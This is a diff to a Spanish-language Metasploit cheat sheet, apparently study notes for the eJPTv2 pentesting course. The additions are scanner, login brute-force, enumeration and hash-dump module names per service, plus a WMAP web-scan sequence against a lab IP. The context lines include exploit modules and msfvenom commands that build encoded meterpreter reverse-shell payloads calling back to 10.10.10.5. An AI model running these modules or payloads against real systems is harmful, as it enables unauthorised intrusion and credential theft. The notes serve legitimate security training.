@@ -26,6 +26,11 @@ Utilidades de la herramienta todo terreno carnal
 
 ```python
 use exploit/unix/ftp/vsftpd_234_backdoor
+search portscan
+search type:auxiliary name:ftp
+auxiliary/scanner/ftp/ftp_version
+auxiliary/scanner/ftp/ftp_login
+auxiliary/scanner/ftp/anonymou
 ```
 
 ### Server Message Block (SMB) - 137,138,139,445
@@ -73,6 +78,10 @@ Utilidades de la herramienta todo terreno carnal
 ```python
 exploit/linux/samba/is_known_pipename
 search ms17_010
+auxiliary/scanner/smb/smb_version
+auxiliary/scanner/smb/smb_enumusers
+auxiliary/scanner/smb/smb_enumshares (set ShowFiles true)
+auxiliary/scanner/smb/smb_login
 ```
 
 ### Secure Shell (SSH) - 22
@@ -98,6 +107,9 @@ Utilidades de la herramienta todo terreno carnal
 
 ```python
 use auxiliary/scanner/ssh/libssh_auth_bypass
+search type:auxiliary name:ssh
+auxiliary/scanner/ssh/ssh_version
+auxiliary/scanner/ssh/ssh_login (set STOP_ON_SUCCESS true and verbose true)
 ```
 
 ### HTTP - 80
@@ -143,6 +155,16 @@ use exploit/unix/http/xdebug_unauth_exec
 exploit/unix/webapp/xoda_file_upload
 exploit/windows/http/badblue_passthru
 exploit/multi/http/apache_mod_cgi_bash_env_exec (shellshock - cgi)
+auxiliary/scanner/http/http_version
+auxiliary/scanner/http/http_header
+auxiliary/scanner/http/apache_userdir_enum
+auxiliary/scanner/http/brute_dirs
+auxiliary/scanner/http/dir_scanner
+auxiliary/scanner/http/dir_listing
+auxiliary/scanner/http/http_put
+auxiliary/scanner/http/files_dir
+auxiliary/scanner/http/http_login (set AUTH_URI /secure/ )
+auxiliary/scanner/http/robots_txt
 ```
 
 ### MYSQL 3306
@@ -173,6 +195,15 @@ Utilidades de la herramienta todo terreno carnal
 ```python
 use auxiliary/scanner/mysql/mysql_hashdump
 use auxiliary/scanner/mysql/mysql_login
+search type:auxiliary name:mysql
+auxiliary/scanner/mysql/mysql_version
+auxiliary/scanner/mysql/mysql_login
+auxiliary/admin/mysql/mysql_enum
+auxiliary/admin/mysql/mysql_sql
+auxiliary/scanner/mysql/mysql_file_enum
+auxiliary/scanner/mysql/mysql_hashdump
+auxiliary/scanner/mysql/mysql_schemadump
+auxiliary/scanner/mysql/mysql_writable_dirs
 ```
 
 ### MSSQL - 1433
@@ -349,3 +380,24 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > payloadx64
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > encodedx86
 ```
+
+### Aplicaciones Web
+Lo siguiente son líneas de comandos que puedes utilizarlo para un análisis completo de una aplicación web utilizando metasploit. Esto se muestra en el curso de eJPTv2
+
+```python
+service postgresql start (en una terminal)
+msfconsole (ahora iniciamos metasploit)
+db_status (comprobar la base de datos)
+load wmap
+wmap_sites -a 192.178.90.3
+wmap_targets -t http://192.178.90.3
+wmap_sites -l
+wmap_targets -l
+wmap_run -t
+wmap_run -e
+wmap_vulns -h
+wmap_vulns -l
+auxiliary/scanner/http/options
+auxiliary/scanner/http/http_put (set PATH data)
+```
+
